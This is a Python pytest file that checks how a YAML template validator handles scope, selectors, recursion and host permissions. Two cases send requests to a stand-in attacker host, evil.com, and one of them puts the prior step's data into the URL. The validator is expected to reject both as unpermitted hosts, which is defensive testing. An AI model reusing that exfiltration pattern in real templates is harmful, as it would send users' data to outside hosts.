"""Scope rules and checks beyond the one-fixture-per-code corpus."""

from typing import ClassVar

import pytest

from crowley import BaseAdapter, BaseExtractor, Crowley, FunctionSpec
from crowley.domain.common import SemVer
from crowley.domain.errors import ValidationReport

HEADER = """\
crowley: 1
id: acme/site
version: 1.0.0
name: Site
description: Test.
permissions:
  hosts: [api.example.com, "api.example.com:8443"]
secrets:
  TOKEN: {description: t}
"""


def template(
    steps: str,
    *,
    output: str = "    output:\n      schema: {}\n",
    extra: str = "",
    inputs: str = "",
) -> str:
    body = "\n".join("      " + line if line else line for line in steps.strip("\n").splitlines())
    operation = f"operations:\n  op:\n    description: d\n{inputs}    steps:\n{body}\n{output}"
    return f"{HEADER}{extra}{operation}"


@pytest.fixture(scope="module")
def crowley() -> Crowley:
    return Crowley()


def check(crowley: Crowley, text: str) -> ValidationReport:
    return crowley.validate_text(text, name="t.yml")


def codes(report: ValidationReport) -> list[str]:
    return [d.code for d in report.diagnostics]


@pytest.mark.parametrize(
    "steps",
    [
        # bindings: loop variables, loop, index_as, page (block body), result (lazy arg)
        "- for_each: [1, 2]\n  as: n\n  index_as: i\n  do:\n    - log: ${{ n + i + loop.index }}",
        "- while: ${{ true }}\n  max_iterations: 2\n  do:\n"
        "    - log: ${{ loop.index }}\n    - break: true",
        "- use: paginate.by_cursor\n  with:\n    next_cursor: ${{ result.next }}\n"
        "  do:\n    - log: ${{ page.cursor }}\n    - continue: true",
        "- use: transform.filter\n  with:\n    items: [1, 2]\n    where: ${{ item > index }}",
        # error is visible in on_error
        "- use: http.get\n  with: {url: 'https://api.example.com/'}\n"
        "  on_error: {default: '${{ error.code }}'}",
        # steps visibility: earlier sibling, and ancestor's earlier sibling
        "- id: a\n  log: x\n- if: ${{ true }}\n  then:\n    - log: ${{ steps.a }}",
        # vars set before, read anywhere in the operation
        "- set: {n: 1}\n- log: ${{ vars.n }}",
        # explicit port and interpolated host-complete URL
        "- use: http.get\n  with: {url: 'https://api.example.com:8443/x'}",
        "- use: http.get\n  with: {url: 'https://api.example.com/${{ prev }}'}",
        "- use: http.get\n  with: {url: 'https://api.example.com:443/x'}",
        "- use: http.get\n  with: {url: '${{ prev }}'}",
        # select checks with language and attribute
        "- use: html.select\n  with: {selector: '//a/@href', language: xpath, attr: href}",
        "- use: json.select_all\n  with: {selector: '$.items[*]', attr: value}",
        "- use: html.extract\n  with:\n    root: [div.a, div.b]\n    fields: {t: h1}",
        "- use: extract.auto\n  with:\n    using: json\n    fields: {id: {selector: $.id}}",
        # concurrency 1 allows assignments to outer vars
        "- set: {n: 0}\n- for_each: [1]\n  concurrency: 1\n  do:\n    - set: {n: 1}",
        # a pure step whose result the next step reads through prev
        "- use: transform.flatten\n  with: {items: [[1]]}\n- log: ${{ prev }}",
    ],
)
def test_valid_scopes(crowley: Crowley, steps: str) -> None:
    report = check(crowley, template(steps))
    assert report.diagnostics == (), [str(d) for d in report.diagnostics]


@pytest.mark.parametrize(
    ("steps", "code", "fragment"),
    [
        ("- log: ${{ args.x }}", "E328", "only available inside template functions"),
        ("- log: ${{ error.code }}", "E328", "only available inside on_error"),
        ("- log: ${{ steps.a }}\n- id: a\n  log: x", "E305", "not visible here"),
        (
            "- if: ${{ true }}\n  then:\n    - id: inner\n      log: x\n- log: ${{ steps.inner }}",
            "E305",
            "not visible",
        ),
        ("- log: ${{ steps[0] }}", "E305", "unknown step"),
        ("- use: local.nope", "E301", "unknown template function"),
        ("- use: 'template:./other.yml#x'\n  do: []", "E304", "take no 'do:'"),
        (
            "- use: http.get\n  with: {url: 'https://api.example.com/'}\n  secrets: {A: b}",
            "E201",
            "secrets",
        ),
        ("- use: transform.flatten\n  with: {items: []}\n  do: []", "E304", "takes no"),
        ("- use: extract.auto\n  with: {using: pdf, fields: {a: x}}", "E326", "not registered"),
        ("- use: html.select\n  with: {selector: div, attr: ''}", "E303", "non-empty"),
        (
            "- use: json.select\n  with: {selector: '$.x', attr: href}",
            "E326",
            "cannot read attribute",
        ),
        (
            "- use: html.select\n  with: {selector: '//a[', language: xpath}",
            "E327",
            "invalid XPath",
        ),
        (
            "- use: html.extract\n  with: {fields: {t: {selector: h1, xpath: //h1}}}",
            "E303",
            "more than one query",
        ),
        (
            "- use: html.extract\n  with: {fields: {t: {selector: [a, 'b >']}}}",
            "E327",
            "invalid CSS",
        ),
        (
            "- use: http.get\n  with: {url: 'https://api.example.com:9999/'}",
            "E318",
            "api.example.com:9999",
        ),
        ("- use: http.get\n  with: {url: 'https://evil.com/${{ prev }}'}", "E318", "evil.com"),
        (
            "- use: http.get\n  with: {url: 'https://api.example.com:99999/'}",
            "E303",
            "invalid port",
        ),
        ("- log: ${{ map([1], x => len(x => x)) }}", "E322", "cannot be a lambda"),
        ("- use: transform.flatten\n- return: 1", "W002", "never used"),
    ],
)
def test_scope_errors(crowley: Crowley, steps: str, code: str, fragment: str) -> None:
    report = check(crowley, template(steps))
    matching = [d for d in report.diagnostics if d.code == code]
    assert matching, [str(d) for d in report.diagnostics]
    assert fragment in matching[0].message


def test_inputs_and_functions(crowley: Crowley) -> None:
    extra = """\
functions:
  fetch:
    description: d
    input: {type: object, properties: {path: {type: string}}, required: [path]}
    output: {}
    steps:
      - log: ${{ args.path + inputs.x }}
      - return: ${{ prev }}
"""
    text = template(
        "- use: local.fetch\n  with: {path: 1}\n- use: local.fetch\n  with: {}",
        extra=extra,
        inputs="    inputs:\n      x: {type: string}\n",
    )
    report = check(crowley, text)
    assert sorted(codes(report)) == ["E303", "E303", "E315"]


def test_requires_is_optional_for_registered_plugins() -> None:
    class Ws(BaseAdapter):
        name: ClassVar[str] = "ws"
        version: ClassVar[str] = "1.0.0"
        schemes: ClassVar[tuple[str, ...]] = ("wss",)

        def functions(self) -> list[FunctionSpec]:
            return [
                FunctionSpec(
                    name="ws.send",
                    version=SemVer(1, 0, 0),
                    adapter="ws",
                    input={
                        "type": "object",
                        "properties": {"url": {"type": "string", "x-crowley-target": True}},
                    },
                )
            ]

    class Pdf(BaseExtractor):
        name: ClassVar[str] = "pdf"
        version: ClassVar[str] = "1.0.0"
        query_languages: ClassVar[tuple[str, ...]] = ("text",)
        default_language: ClassVar[str] = "text"

    crowley = Crowley(
        adapters=[Ws()],
        extractors=[Pdf()],
        functions=[FunctionSpec(name="mycorp.decode", version=SemVer(1, 0, 0))],
    )
    steps = (
        "- use: mycorp.decode\n- use: ws.send\n  with: {url: 'wss://evil.com/'}\n- use: pdf.parse"
    )
    report = check(crowley, template(steps))
    assert codes(report) == ["E318"]  # registered functions need no requires
    pinned = template(
        steps, extra='requires: [mycorp.decode@^1, "adapter:ws@^1", "extractor:pdf"]\n'
    )
    assert codes(check(crowley, pinned)) == ["E318"]
    too_new = template(steps, extra='requires: ["mycorp.decode@^2"]\n')
    assert codes(check(crowley, too_new)) == ["E302", "E318"]
    unknown = template("- use: mycorp.missing")
    assert codes(check(crowley, unknown)) == ["E301"]


def test_template_level_checks(crowley: Crowley) -> None:
    extra = """\
defaults:
  http:
    timeout: never
    headers: {Authorization: "Bearer ${{ secrets.TOKEN }} ${{ inputs.x }}"}
schemas:
  broken: {type: 12}
"""
    output = """\
    output:
      schema: {}
    tests:
      - name: t
        expect:
          assert: ["${{ len(output) > 0 and steps.x }}"]
"""
    report = check(crowley, template("- log: x", extra=extra, output=output))
    found = {(d.code, d.path) for d in report.diagnostics}
    assert ("E205", "defaults.http.timeout") in found
    assert ("E328", "defaults.http.headers.Authorization") in found
    assert ("E319", "schemas.broken.type") in found
    assert ("E328", "operations.op.tests[0].expect.assert[0]") in found


def test_output_value_sees_top_level_steps(crowley: Crowley) -> None:
    output = "    output:\n      value: ${{ steps.first }}\n      schema: {}\n"
    assert check(crowley, template("- id: first\n  log: x", output=output)).ok
    bad = "    output:\n      value: ${{ steps.inner }}\n      schema: {}\n"
    nested = "- for_each: [1]\n  do:\n    - id: inner\n      log: x"
    assert codes(check(crowley, template(nested, output=bad))) == ["E305"]


def test_shared_schema_refs_resolve_for_emit(crowley: Crowley) -> None:
    extra = "schemas:\n  rows: {type: array}\n"
    output = "    output:\n      schema: {$ref: '#/schemas/rows'}\n"
    assert check(crowley, template("- emit: 1", extra=extra, output=output)).ok


def test_invalid_template_function_input_schema(crowley: Crowley) -> None:
    extra = (
        "functions:\n  f:\n    description: d\n    input: {type: array}\n"
        "    output: {}\n    steps: []\n"
    )
    report = check(crowley, template("- use: local.f", extra=extra))
    assert codes(report) == ["E319"]


def test_mutual_recursion_is_reported_for_each_function(crowley: Crowley) -> None:
    extra = """\
functions:
  a: {description: d, output: {}, steps: [{use: local.b}]}
  b: {description: d, output: {}, steps: [{use: local.a}]}
"""
    report = check(crowley, template("- use: local.a", extra=extra))
    assert codes(report) == ["E317", "E317"]
    assert "a → b → a" in report.diagnostics[0].message


def test_self_reference_by_path(tmp_path: object) -> None:
    from pathlib import Path

    folder = Path(str(tmp_path))
    path = folder / "site.yml"
    path.write_text(template("- use: 'template:./site.yml#op'"), encoding="utf-8")
    report = Crowley().validate(str(path))
    assert codes(report) == ["E324"]


def test_validation_is_cached(crowley: Crowley) -> None:
    text = template("- log: x")
    first = crowley.validate_text(text, name="t.yml")
    assert crowley.validate_text(text, name="t.yml") is first
